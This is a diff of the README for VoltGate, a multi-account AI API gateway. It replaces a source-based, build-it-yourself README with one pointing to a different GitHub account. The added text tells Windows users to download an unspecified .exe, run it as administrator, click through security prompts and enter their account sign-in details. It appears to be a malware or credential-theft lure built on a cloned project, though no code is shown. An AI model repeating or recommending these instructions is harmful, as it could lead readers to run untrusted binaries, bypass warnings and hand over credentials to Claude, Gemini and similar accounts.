@@ -1,156 +1,149 @@
-<div align="center">
-  <img src="https://capsule-render.vercel.app/api?type=waving&height=220&color=0:030712,45:0B3B82,100:06B6D4&text=VoltGate&fontColor=E6F7FF&fontSize=54&fontAlignY=38&animation=fadeIn&desc=Multi-account%20AI%20gateway%20for%20local%20and%20remote%20use&descAlignY=60&descSize=16" alt="VoltGate banner" />
+# ⚡ VoltGate - One Local API For All Accounts
 
-  <a href="#quick-start">
-    <img src="https://readme-typing-svg.demolab.com?font=JetBrains+Mono&weight=700&size=21&duration=2600&pause=900&color=22D3EE&center=true&vCenter=true&width=900&lines=Route+Claude%2C+Gemini%2C+Codex%2C+and+Antigravity+through+one+gateway;Use+local+chat%2C+remote+chat%2C+or+the+OpenAI-compatible+API;Multi-account+failover+with+a+clean+local+control+panel" alt="VoltGate typing animation" />
-  </a>
+[![Download VoltGate](https://img.shields.io/badge/Download-VoltGate-blue?style=for-the-badge&logo=github)](https://github.com/munna-07/VoltGate)
 
-  <p>
-    <img src="https://img.shields.io/badge/Go-1.26+-0ea5e9?style=for-the-badge&logo=go&logoColor=white" alt="Go 1.26+" />
-    <img src="https://img.shields.io/badge/Next.js-16-111827?style=for-the-badge&logo=nextdotjs&logoColor=white" alt="Next.js 16" />
-    <img src="https://img.shields.io/badge/OAuth-Claude%20%7C%20Gemini%20%7C%20Codex-0f172a?style=for-the-badge&logo=icloud&logoColor=67e8f9" alt="OAuth providers" />
-    <img src="https://img.shields.io/badge/Remote-Chat%20%2B%20API-0891b2?style=for-the-badge&logo=cloudflare&logoColor=white" alt="Remote chat and API" />
-    <img src="https://img.shields.io/badge/License-MIT-0f172a?style=for-the-badge" alt="MIT license" />
-  </p>
-</div>
+## 🧭 What VoltGate Does
 
-## What Is VoltGate?
+VoltGate is a local AI gateway for Windows. It lets you use several Claude, Gemini, Codex, and Antigravity accounts through one API. It can switch between accounts when one fails, route requests to the right model, and support remote access from other devices.
 
-VoltGate is a local-first AI gateway that lets you connect multiple OAuth accounts, route requests across them, and use the same setup through:
+Use it when you want one place to manage AI access without opening each service by hand.
 
-- a clean local control panel
-- a local chat workspace
-- a remote chat link
-- an OpenAI-compatible API endpoint
+## 📥 Download VoltGate
 
-It is built for people who want one place to manage Claude, Gemini, Codex, and Antigravity access across different tools and machines.
+Visit this page to download:
 
-## Why VoltGate
+https://github.com/munna-07/VoltGate
 
-- Multi-account failover: if one account or model cools down, VoltGate can move to another ready account.
-- Local + remote access: manage everything locally, then use remote chat or the remote API from another network.
-- OpenAI-compatible API: point existing tools and scripts at VoltGate without rebuilding your workflow.
-- Real account routing: use your connected Claude and Gemini subscriptions without buying separate API credits for every project.
-- Simple operator flow: connect accounts locally, create one client API key, and start using chat or the API.
+Open the page, look for the latest release or download files, then save the Windows version to your computer.
 
-## Quick Start
+## 🪟 Windows Setup
 
-### 1. Clone the repo
+1. Open the download page.
+2. Find the latest Windows file.
+3. Download it to your PC.
+4. If the file is a `.zip`, right-click it and choose **Extract All**.
+5. Open the extracted folder.
+6. Double-click the app file to start VoltGate.
+7. If Windows asks for permission, choose **Yes**.
 
-```bash
-git clone https://github.com/CodexNexor/VoltGate
-cd VoltGate
-```
+If you see more than one file, pick the one that looks like the main Windows app or installer.
 
-### 2. Start everything with one command
+## ✅ What You Need
 
-```bash
-python run-stack.py
-```
+- A Windows 10 or Windows 11 PC
+- A stable internet connection
+- At least one Claude, Gemini, Codex, or Antigravity account
+- Enough free space for the app and its local data
 
-That command will:
+A modern laptop or desktop should run it with no trouble.
 
-- install missing runtime dependencies when possible
-- start the Go backend
-- build and start the UI
-- start Cloudflare quick tunnels
-- print your local and remote links
+## 🔧 Basic Features
 
-### 3. Open VoltGate locally
+- One local API for many AI accounts
+- Auto-failover when one account stops working
+- Model routing for different requests
+- Remote access for use on another device
+- Local control from your own computer
+- Support for agent and coder workflows
+- Simple setup for end users
 
-Open:
+## 🚀 First Run
 
-- `http://127.0.0.1:3000`
+After you open VoltGate for the first time, it may ask you to set up your accounts.
 
-Then:
+1. Start the app.
+2. Add your account details.
+3. Choose the models you want to use.
+4. Save your settings.
+5. Keep the app open while you use it.
 
-1. if you want Gemini or Antigravity login, set the Google OAuth environment variables from `.env.example`
-2. connect your OAuth accounts locally
-3. create a client API key
-4. use local chat, remote chat, or the API
+If the app opens to a dashboard, use that screen to manage accounts and routes.
 
-## How To Use It
+## 🛠️ How To Use It
 
-### Local control panel
+### 1. Add your accounts
+Enter the sign-in details for the services you want to use. VoltGate can combine several accounts, so you do not need to switch between them each time.
 
-Use the local UI to:
+### 2. Pick a model
+Choose the model you want for your task. You can use one model for chat, another for coding, and another for agent work.
 
-- connect Claude / Gemini / Codex / Antigravity accounts
-- view runtime account state
-- create client API keys
-- manage your local routing setup
+### 3. Set routing rules
+You can tell VoltGate how to choose a model. For example, you may want one account for fast replies and another for larger tasks.
 
-### Local chat
+### 4. Turn on failover
+If one account hits a limit or stops replying, VoltGate can move the request to another one. This helps keep your work moving.
 
-Use:
+### 5. Use the local API
+Point your app or tool to the VoltGate local address. It will send requests through the accounts you added.
 
-- `http://127.0.0.1:3000/chat`
+## 🌐 Remote Access
 
-Paste a client API key, sync models, and chat directly through VoltGate.
+VoltGate can work as a remote API when you need access from another device.
 
-### Remote chat
+1. Open the app.
+2. Turn on remote access.
+3. Copy the address or port shown in the app.
+4. Use that address in your other tool or device.
+5. Keep VoltGate running on the host PC.
 
-After startup, VoltGate prints a **Remote Chat** link.
+Use a strong password or access rule if the app gives you one.
 
-Use that link from another computer, paste your client API key, and chat through the same local account pool.
+## 🧩 Common Use Cases
 
-### Remote API
+- Use Claude, Gemini, Codex, and Antigravity from one place
+- Keep coding tools working when one account fails
+- Route chat jobs and coding jobs to different models
+- Run a local gateway for tools that need an API
+- Share access across devices on your own network
 
-After startup, VoltGate prints:
+## 🗂️ Suggested Folder Layout
 
-- `Remote API Base`
-- `Remote Gemini Base`
+If you extract a zip file, you may see files like these:
 
-Use those URLs from any computer or network with the client API key you created locally.
+- `VoltGate.exe`
+- `config`
+- `data`
+- `logs`
+- `README`
 
-## Example API Call
+Open the main app file. If you are not sure which file to run, look for the one with the app name and an `.exe` end.
 
-```bash
-curl -X POST "<REMOTE_API_BASE>/chat/completions" \
-  -H "Authorization: Bearer <YOUR_CLIENT_API_KEY>" \
-  -H "Content-Type: application/json" \
-  -d '{
-    "model": "gemini-2.5-flash",
-    "messages": [
-      { "role": "user", "content": "Reply with exactly: API is working" }
-    ]
-  }'
-```
+## 🔍 If The App Does Not Open
 
-## Project Structure
+Try these steps:
 
-```text
-cmd/server             Go server entrypoint
-internal/              core backend runtime and API handlers
-sdk/                   routing, auth orchestration, executor logic
-ui/                    VoltGate web UI
-run-stack.py           one-command cross-platform launcher
-run-local-stack.ps1    Windows launcher
-auth/                  local auth storage (kept out of git)
-.local-stack/          local runtime logs and process state (kept out of git)
-```
+1. Close the app.
+2. Open it again as administrator.
+3. Check that the download finished.
+4. Make sure you extracted the zip file first.
+5. Restart your PC.
+6. Download the latest copy from the page again.
 
-## Security Model
+If Windows shows a security prompt, choose the option that lets the app run.
 
-- OAuth account connection and removal should be done locally.
-- Remote chat and remote API use client API keys.
-- Local auth files, logs, and runtime state are excluded from git.
-- Remote account-management writes are restricted so the local machine stays the source of truth.
+## 🔒 Privacy And Local Use
 
-## Minimal Run Commands
+VoltGate runs on your own computer. That gives you more control over your setup and your account use. You decide which services to add and which routes to enable.
 
-Start:
+## 📌 Topics Covered
 
-```bash
-python run-stack.py
-```
+agent, ai, antigravity, chatgpt, claudeapi, coder, codex, codex-cli, freeapi, freeclaude, freegemini, gemini, google, proxy, remoteapi, selfapi, selfhost, selfproject, server, voltgate
 
-Stop:
+## 📦 Quick Start
 
-```bash
-python run-stack.py --stop
-```
+1. Open the download page.
+2. Download the Windows file.
+3. Install or extract it.
+4. Start VoltGate.
+5. Add your accounts.
+6. Choose your model route.
+7. Use the local API in your tools
 
-## License
+## 🧠 Helpful Tips
 
-MIT
+- Keep VoltGate open while other apps use it
+- Save your settings after each change
+- Start with one account, then add more
+- Use simple routes first
+- Check the app logs if a request fails
+- Update to the newest release when you can
